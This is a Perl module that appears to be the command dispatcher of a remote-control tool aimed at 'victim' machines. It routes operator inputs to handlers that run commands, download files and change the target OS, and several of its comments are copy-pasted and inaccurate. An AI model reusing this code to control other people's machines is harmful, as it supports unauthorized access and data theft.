 #!/usr/bin/perl
package process_response;

#Subroutine to process data
sub process_command{

	my $data = shift;
	#'command' replies with all available commands.
	if($data =~ /^command /){
		#remove all character from the begining of the string upto and including the first space.
		$data =~ s/^\S+\s*//;

		#Get command to run and log command
		server_response_command::send_command($data);

	#'comment' replies with all available commands.
	}elsif($data =~ /^comment /){
		#remove all character from the begining of the string upto and including the first space.
		$data =~ s/^\S+\s*//;

		#Get command and log it
		server_response_comment::send_comment($data);

	#'device' replies with all available commands.
	}elsif($data =~ /^device /){
		#remove all character from the begining of the string upto and including the first space.
		$data =~ s/^\S+\s*//;

		#Get device name and make a new working directory for said device
		server_response_device::set_device($data);

	#'file' replies with all available commands.
	}elsif($data =~ /^file /){
		#remove all character from the begining of the string upto and including the first space.
		$data =~ s/^\S+\s*//;

		#Get file name to download and log entry
		server_response_file::send_file($data);

	#'help' replies with all available commands.
	}elsif($data eq "help"){
		#Display help menu
		server_response_help::display_help();

	#Change to no color output
	}elsif($data =~ /^color /){
		#remove all character from the begining of the string upto and including the first space.
		$data =~ s/^\S+\s*//;

		#Turn color output on the victims machine on or off.
		server_response_color::turn_color($data);

	#Change username
	}elsif($data =~ /^user /){
		#remove all character from the begining of the string upto and including the first space.
		$data =~ s/^\S+\s*//;

		#Turn color output on the victims machine on or off.
		server_response_user::change_user($data);


	#Change to no color output
	}elsif($data =~ /^victim /){
		#remove all character from the begining of the string upto and including the first space.
		$data =~ s/^\S+\s*//;

		#Turn color output on the victims machine on or off.
		server_response_victim::change_os($data);


	#If the command does not match any of the above reply with error message and the command.
	}else{
		my $reply = $color_start."Unrecognized command: $data\n".$color_end;
		server_connection::send_message($reply);
	}
	return;
}

1127;
